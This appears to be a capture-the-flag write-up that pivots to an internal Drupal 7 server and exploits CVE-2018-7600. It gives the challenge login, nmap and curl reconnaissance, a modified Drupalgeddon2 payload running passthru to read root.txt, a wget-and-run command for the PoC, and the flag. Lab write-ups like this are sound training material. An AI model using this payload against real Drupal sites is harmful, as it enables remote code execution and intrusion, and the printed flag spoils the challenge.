	compromise the machine and get root.txt

	your entry point on 3.127.39.160 on port 20022 

	username: cybertalents

	pass: cybertalents

```sh
$ uname -a
# Linux 019fa6a677eb 5.4.0-1035-aws #37-Ubuntu SMP Wed Jan 6 21:01:57 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
```

```sh
$ find / -perm -u=s 2>/dev/null
```
for SUID n0thing intersting :/

while scrolling on LinPEAS logs i got this :

	/usr/bin/nmap
	/usr/bin/nc
	/usr/bin/netcat
	/usr/bin/wget
	/usr/bin/curl
	/usr/bin/base64
	/usr/bin/python3
	/usr/bin/perl 

just little bit curious about nmap on ubuntu machine ;), so i checked for available interfaces throw `ifconfig` found 2 ifaces (`172.22.0.3`, `172.22.0.2`), running nmap on both and we see that `172.22.0.2` running an apache web server:

```sh
$ nmap -sV 172.22.0.2

# ...
# 80/tcp open  http    Apache httpd 2.4.10 ((Debian))
# ...
```

quick headers fetch :

```sh
$ curl -v -s http://172.22.0.2 1> /dev/null
```

	* Connected to 172.22.0.2 (172.22.0.2) port 80 (#0)
	> GET / HTTP/1.1
	> Host: 172.22.0.2
	> User-Agent: curl/7.68.0
	> Accept: */*
	> 
	* Mark bundle as not supporting multiuse
	< HTTP/1.1 200 OK
	< Date: Sat, 27 Feb 2021 19:54:36 GMT
	< Server: Apache/2.4.10 (Debian)
	< X-Powered-By: PHP/7.0.28
	< Expires: Sun, 19 Nov 1978 05:00:00 GMT
	< Cache-Control: no-cache, must-revalidate
	< X-Content-Type-Options: nosniff
	< Content-Language: en
	< X-Frame-Options: SAMEORIGIN
	< X-Generator: Drupal 7 (http://drupal.org)
	< Vary: Accept-Encoding
	< Content-Length: 7408
	< Content-Type: text/html; charset=utf-8

well now its clear as the sun we have a website running `Drupal 7` which vulnerable to RCE, found this poc [CVE-2018-7600](https://github.com/FireFart/CVE-2018-7600) , just change :

```python
# ...
HOST="http://172.22.0.2/"
# ...
get_params = {'q':'user/password', 'name[#post_render][]':'passthru', 'name[#markup]':'ls /; cat /root.txt', 'name[#type]':'markup'}
# ...
```
exploit :

```sh
$ wget http://domain.org/CVE-2018-7600-drupal.txt -O poc.py
$ python3 poc.py
```

__FLAG : c288f114adda37a242a5efb1c2637dc2__